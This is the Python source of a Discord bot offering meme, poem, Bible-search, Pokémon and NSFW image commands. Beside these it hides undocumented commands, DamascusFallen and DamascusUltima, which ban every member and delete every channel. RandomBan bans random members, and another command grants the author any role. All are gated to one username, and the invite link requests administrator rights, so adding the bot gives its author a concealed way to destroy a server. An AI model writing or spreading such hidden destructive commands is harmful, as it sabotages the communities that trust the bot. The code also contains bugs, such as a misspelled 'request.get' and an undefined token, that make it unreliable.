#!/usr/bin/env python
import discord
import random
import time
import json
import bs4
import html2text as h2t
import os
import requests
import re
from discord.ext import commands
import discord.utils
import math
import linecache
import sys
print("Starting Bot")

description = '''GenghiBot v69.6969 snapshot 69wv69'''
bot = commands.Bot(command_prefix='G', description=description)
bot.remove_command('help')
@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')

@bot.command()
async def add(ctx, left: int, right: int):
    """Adds two numbers together."""
    await ctx.send(left + right)

@bot.command(pass_context=True)
async def help(ctx):
    message = ctx.message
    
    embed = discord.Embed(title="~~Der Komandats...~~", description="Eis:", color=0x00ff00)
    embed.set_author(name="Help", icon_url=(json.loads(requests.get("https://nekobot.xyz/api/image?type=neko").text))["message"])
    embed.add_field(name="__***Gsay***__", value="Says your deepest desires...", inline=True)
    embed.add_field(name="__***Grepeat***__", value="[number of messages] [message]", inline=True)
    embed.add_field(name="__***Gadd***__", value="Does super complex nasa mathematics", inline=True)
    embed.add_field(name="__***Gping***__", value="says the pOnG!", inline=True)
    embed.add_field(name="__***Grestart***__", value="Restarts the bot", inline=True)
    embed.add_field(name="__***Ghentai***__", value="[number of pics] \n[delay betwen pics]", inline=True)
    embed.add_field(name="__***Gholo***__", value="[number of pics] \n[delay betwen pics]", inline=True)
    embed.add_field(name="__***Gpoem***__", value="Sends words that touch your heart", inline=True)
    embed.add_field(name="__***Ghneko***__", value="[number of pics] \n[delay betwen pics]", inline=True)
    embed.add_field(name="__***GSFW***__", value="[number of pics] \n[delay betwen pics]", inline=True)
    embed.add_field(name="__***Gneko***__", value="[number of pics] \n[delay betwen pics]", inline=True)
    embed.add_field(name="__***Glewd***__", value="[sends lewd stuff]", inline=True)
    embed.add_field(name="__***Gpokemon***__", value="[sends pokemons owo]", inline=True)
    embed.add_field(name="__***GOwO***__", value="for when you feel really needy", inline=True)
    embed.add_field(name="__***Ghello***__", value="Says hi caus u are cute", inline=True)
    embed.add_field(name="__***Gembed***__", value="sends an embed with [title] and [content]", inline=True)
    embed.add_field(name="__***Ginvite***__", value="Sends a Discord invite for GenghiBot", inline=True)
    embed.set_footer(text="Genghius is the best...", icon_url=(json.loads(requests.get("https://nekobot.xyz/api/image?type=hentai").text))["message"])
    await message.channel.send(embed=embed)


@bot.command()
async def say(ctx, *, message = "what do you want me to say then?"):
    """I will say your desires"""
    await ctx.channel.purge(limit=1)
    await ctx.send(message)

@bot.command()
async def repeat(ctx, times: int, *, message = "Repeating . . ."):
    """Repeats a message multiple times."""
    for i in range(times):
        await ctx.send(message)

@bot.command()
async def GP(ctx, user=".", times=1):
    """Ghost pings people"""
    if str(ctx.message.author) == "Genghius#1605":
        await ctx.channel.purge(limit=1)
        for i in range(times):
            await ctx.send(user, delete_after=0)

@bot.command()
async def poem(ctx):
    poem = requests.get("https://w0.poemhunter.com/members/random-poem/").text
    p = bs4.BeautifulSoup(poem, "html.parser").find("div", {"class": "content-block bordered random-poem"})
    p = h2t.html2text(p.prettify())
    p = [(p[i:i+1000]) for i in range(0, len(p), 1000)]
    for section in p:
        await ctx.send(section)

@bot.command()
async def embed(ctx, Title="OwO", *, Content="OwO"):
    await ctx.channel.purge(limit=1)
    embed = discord.Embed(title=Title, description=f"*{ctx.message.author} says:*", color=0x00ff00)
    embed.add_field(name="...", value=Content, inline=True)
    await ctx.message.channel.send(embed=embed)

@bot.command()
async def ping(ctx):
    """ping"""
    await ctx.send(str(int(bot.latency * 1000)) + "ms")

@bot.command()
async def restart(ctx):
    """Restarts the bot"""
    await ctx.send('restarting ...')
    os.execv(__file__, sys.argv)

@bot.command()
async def hentai(ctx, times = 1, delay = 3):
    """sends hentai the defined number of times with the defined delay"""
    if ctx.channel.is_nsfw():
        if ((times * delay) < 2000):
            for n in range(times):
               html = requests.get("https://nekobot.xyz/api/image?type=hentai").text
               JSON = json.loads(html)
               await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
               time.sleep(delay)
        else:
            await ctx.send("Sowwy, uwu i wont send that many msgs uwu, it would take too long uwu")
    else:
        await ctx.send("OwO, this may not be the right place for me to send that, try a NSFW  channel?")

@bot.command()
async def neko(ctx, times = 1, delay = 3):
    """sends nekos the defined number of times with the defined delay"""
    if ctx.channel.is_nsfw():
        if ((times * delay) < 2000):
            for n in range(times):
               html = requests.get("https://nekobot.xyz/api/image?type=neko").text
               JSON = json.loads(html)
               await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
               time.sleep(delay)
        else:
            await ctx.send("Sowwy, uwu i wont send that many msgs uwu, it would take too long uwu")
    else:
        await ctx.send("OwO, this may not be the right place for me to send that, try a NSFW  channel?")

@bot.command()
async def ban(ctx, member : discord.Member, *, reason=None):
    if str(ctx.message.author) == "Genghius#1605":
        await member.ban(reason = reason)
    else:
        pass

@bot.command()
async def kick(ctx, member : discord.Member, *, reason=None):
    if str(ctx.message.author) == "Genghius#1605":
        await member.kick(reason = reason)
    else:
        pass

@bot.command()
async def clear(ctx, amount=1):
    if str(ctx.message.author) == "Genghius#1605":
        await ctx.channel.purge(limit=amount + 1)
    else:
        pass

@bot.command()
async def lewd(ctx, times = 2, delay = 3):
    """sends a mixture of hentai gifs, nekos and hentai the defined number of times with the defined delay"""
    if ctx.channel.is_nsfw():
        if ((times * delay) < 2000):
            for n in range(times):
                option = random.randint(1, 4)
                if option == 1:
                   html = requests.get("https://nekobot.xyz/api/image?type=hentai").text
                elif option == 2:
                   html = requests.get("https://nekobot.xyz/api/image?type=neko").text
                elif option == 3:
                   html = request.get("https://nekobot.xyz/api/image?type=holo").text
                else:
                   html = requests.get("https://nekobot.xyz/api/image?type=hneko").text
                JSON = json.loads(html)
                await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
                time.sleep(delay)
        else:
            await ctx.send("Sowwy, uwu i wont send that many msgs uwu, it would take too long uwu")
    else:
        await ctx.send("OwO, this may not be the right place for me to send that, try a NSFW  channel?")

@bot.command()
async def hneko(ctx, times = 1, delay = 3):
    """sends hentai neko pics the defined number of times with the defined delay"""
    if ctx.channel.is_nsfw():
        if ((times * delay) < 2000):
            for n in range(times):
               html = requests.get("https://nekobot.xyz/api/image?type=hneko").text
               JSON = json.loads(html)
               await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
               time.sleep(delay)
        else:
            await ctx.send("Sowwy, uwu i wont send that many msgs uwu, it would take too long uwu")
    else:
        await ctx.send("OwO, this may not be the right place for me to send that, try a NSFW  channel?")

@bot.command()
async def SFW(ctx, times = 1, delay = 3):
    """sends a mixture of hentai gifs, nekos and hentai the defined number of times with the defined delay"""
    if ((times * delay) < 2000):
        for n in range(times):
            option = random.randint(1, 2)
            if option == 1:
               html = requests.get("https://nekobot.xyz/api/image?type=holo").text
            else:
               html = requests.get("https://nekobot.xyz/api/image?type=neko").text
            JSON = json.loads(html)
            await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
            time.sleep(delay)
    else:
        await ctx.send("Sowwy, uwu i wont send that many msgs uwu, it would take too long uwu")

@bot.command()
async def holo(ctx, times = 1, delay = 3):
    """sends fox neko pics the defined number of times with the define delay"""
    if ctx.channel.is_nsfw():
        if((times * delay) < 2000):
            for n in range(times):
                html = requests.get("https://nekobot.xyz/api/image?type=holo").text
                JSON = json.loads(html)
                await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=JSON["message"]))
                time.sleep(delay)
        else:
            await ctx.send("Sowwy. uwu i wont send that many msgs uwu, it would take too long uwu")
    else:
        await ctx.send("OwO, this may not be the right place for me to send that, try a NSFW channel")

@bot.command()
async def backup(ctx):
    """Backs up script"""
    os.system("cp Bot.py Backup.txt")
    await ctx.send("Backup script has been updated.")

#To be bettered
@bot.command()
async def people(ctx):
    p = ""
    for member in ctx.guild.members:
        p += f"{member.name}\n"
    p = [(p[i:i+300]) for i in range(0, len(p), 300)]
    for section in p:
        await ctx.send(section)

@bot.command()
async def RandomBan(ctx, quantity=1):
    if str(ctx.message.author) == "Genghius#1605":
        for x in range(0, quantity):
            try:
                member = ctx.guild.members[random.randint(0, len(ctx.guild.members))]
                await member.ban(reason="Banned randomly")
                await ctx.send(f"Randomly banned {member} for no reason at all...")
            except:
                await ctx.send(f"Cannot ban {member}")
    else:
        await ctx.send("You do not have permissions from the great khan himself...")

@bot.command()
async def DamascusWrath(ctx, rolename):
    if str(ctx.message.author) == "Genghius#1605":
        await ctx.channel.purge(limit=1)
        member = ctx.message.author
        role = discord.utils.get(ctx.guild.roles, name=rolename)
        await member.add_roles(role, reason=None)

@bot.command()
async def DamascusFallen(ctx):
    if str(ctx.message.author) == "Genghius#1605":
        for member in ctx.guild.members:
            try:
                await member.ban(reason="Thy Wrath of Damascus hath fallen upon thee...")
                await ctx.send(f"Razivous'ed {member}")
            except:
                await ctx.send(f"{member} is't an unholiest of souls. Thy Wrath of Damascus Shan't Touch thy wicked self.")
        for channel in ctx.guild.channels:
            await channel.delete()
    else:
        await ctx.send("Unworthy thyne soul, unholy thy intents. Thou hast not the will to call upon Damascus")

@bot.command()
async def DamascusUltima(ctx):
    if str(ctx.message.author) == "Genghius#1605":
        for member in ctx.guild.members:
            try:
                await member.ban(reason="Thy Wrath of Damascus hath fallen upon thee...")
            except:
                pass
            for channel in ctx.guild.channels:
                await channel.delete()
    else:
        await ctx.send("Unworthy thyne soul, unholy thy intents. Thou hast not the will to call upon Damascus")

@bot.command()
async def hello(ctx):
  """says hello back caus u r cute"""
  await ctx.send(ctx.message.author.mention + ', hello!!!')

@bot.command()
async def bible(ctx, *, text=""):
    """search the bible"""
    bible = open("kjv.txt")
    versicle = bible.readline()
    if len(text) >= 4:
        for i in range(0, 31103):
          if text in versicle.lower():
            await ctx.send(versicle)
            break
          else: 
            versicle = bible.readline()
    else:
        await ctx.send("OwO that search term was a little.... too short, UwU imma send somehting random.....")
        await ctx.send(linecache.getline('kjv.txt',random.randint(1, 31103)))

@bot.command(pass_context=True)
async def OwO(ctx):
  """OwO!!!! UwU!!!!!"""
  await ctx.send(ctx.message.author.mention + ' Genghius luv\'s u abe owo!')

@bot.command()
async def enghius(ctx):
  """Genghius based God owo"""
  await ctx.send('Thou hast summoned der \n **Genghius-Saur.**')

@bot.command()
async def pokemon(ctx, times=1, delay=3):
    """Sends pokemons owo"""
    if((times * delay) < 2000):
        for n in range(times):
            num = random.randint(1, 890)
            if num < 10:
                num = "00" + str(num)
            elif num < 100:
                num = "0" + str(num)
            await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).set_image(url=f"https://assets.pokemon.com/assets/cms2/img/pokedex/full/{num}.png"))
            time.sleep(delay)
    else:
        await ctx.send("Sowwy. uwu i wont send that many msgs uwu, it would take too long uwu")

@bot.command()
async def invite(ctx):
  """Sends a discord invite for GenghiBot"""
  await ctx.message.channel.send(embed=discord.Embed(color=0x78ff99).add_field(name="Invite me OwO", value="https://discordapp.com/api/oauth2/authorize?client_id=639250815332253696&permissions=8&scope=bot", inline=True))

bot.run(Token)

